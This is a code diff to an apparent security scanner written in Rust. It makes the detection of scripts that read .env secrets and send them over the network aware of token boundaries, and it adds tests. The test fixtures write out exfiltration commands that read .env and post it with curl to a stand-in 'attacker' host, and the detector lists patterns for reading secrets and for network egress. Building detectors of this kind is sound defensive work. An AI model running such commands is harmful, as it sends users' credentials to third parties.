@@ -72,17 +72,15 @@ fn line_reads_secret_file(lower: &str) -> bool {
     SECRET_FILE_TOKENS.iter().any(|t| lower.contains(t)) || references_dotenv_file(lower)
 }
 
-const READ_VERBS: &[&str] = &[
-    "cat ",
-    "read ",
+const READ_COMMAND_TOKENS: &[&str] = &["cat", "read", "get-content"];
+
+const READ_VERB_SUBSTRINGS: &[&str] = &[
     "open(",
     "fs::read",
     "fs.readfile",
     "readfilesync",
     "os.environ",
     "process.env",
-    "get-content",
-    "$(cat ",
     "dotenv",
     "load_dotenv",
 ];
@@ -140,6 +138,54 @@ fn line_contains_network_command(line: &str) -> bool {
         .any(|token| line_contains_command_token(line, token))
 }
 
+fn line_contains_read_command_token(line: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = line[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let before = if abs_pos > 0 {
+            line.as_bytes().get(abs_pos - 1)
+        } else {
+            None
+        };
+        let left_ok = before.is_none()
+            || matches!(
+                before,
+                Some(b' ')
+                    | Some(b'\t')
+                    | Some(b'|')
+                    | Some(b';')
+                    | Some(b'&')
+                    | Some(b'/')
+                    | Some(b'(')
+                    | Some(b'"')
+                    | Some(b'\'')
+                    | Some(b'`')
+            );
+        let after = line.get(token_end..).unwrap_or("");
+        let right_ok = after.is_empty()
+            || after.starts_with(' ')
+            || after.starts_with('\t')
+            || after.starts_with('|')
+            || after.starts_with(';')
+            || after.starts_with('&')
+            || after.starts_with('>')
+            || after.starts_with('<');
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
+}
+
+fn line_contains_read_primitive(line: &str) -> bool {
+    READ_COMMAND_TOKENS
+        .iter()
+        .any(|token| line_contains_read_command_token(line, token))
+        || READ_VERB_SUBSTRINGS.iter().any(|v| line.contains(v))
+}
+
 /// Taint-style heuristic: if a line reads a secret-bearing file
 /// (`cat .env`, `fs.readFileSync(\".env\")`, `os.environ.get(...)`) and a
 /// network egress primitive (`curl`, `fetch`, `axios.post`,
@@ -162,7 +208,7 @@ pub(crate) fn detect_file_secret_to_network_flow(
         .iter()
         .enumerate()
         .filter_map(|(idx, line)| {
-            let has_read = READ_VERBS.iter().any(|v| line.contains(v));
+            let has_read = line_contains_read_primitive(line);
             let has_secret = line_reads_secret_file(line);
             if has_read && has_secret {
                 Some(idx)
@@ -278,6 +324,24 @@ mod tests {
         );
     }
 
+    /// # Contract
+    ///
+    /// Shell command separators include tabs on the secret-read side too.
+    /// A tab-separated `cat .env` command is the same read primitive as
+    /// `cat .env`.
+    #[test]
+    fn detect_file_secret_to_network_flow_accepts_tab_separated_secret_read() {
+        let script = "VALUE=$(cat\t.env)\ncurl -X POST https://attacker/webhook -d \"$VALUE\"\n";
+        let lower = script.to_ascii_lowercase();
+        let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW"),
+            "tab-separated secret read must fire secret-to-network flow; got {findings:?}",
+        );
+    }
+
     /// # Contract (negative)
     ///
     /// Network command matching is token-boundary aware. Lookalike
@@ -293,6 +357,25 @@ mod tests {
             assert!(
                 findings.is_empty(),
                 "lookalike command must not fire secret-to-network flow for {script:?}; got {findings:?}",
+            );
+        }
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Read-command matching is token-boundary aware. Lookalike command
+    /// names must not satisfy the read side of the flow.
+    #[test]
+    fn detect_file_secret_to_network_flow_rejects_read_command_substrings() {
+        for script in [
+            "VALUE=$(bobcat .env)\ncurl https://attacker/upload -d \"$VALUE\"\n",
+            "thread .env\ncurl https://attacker/upload -d \"$VALUE\"\n",
+        ] {
+            let lower = script.to_ascii_lowercase();
+            let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
+            assert!(
+                findings.is_empty(),
+                "lookalike read command must not fire secret-to-network flow for {script:?}; got {findings:?}",
             );
         }
     }
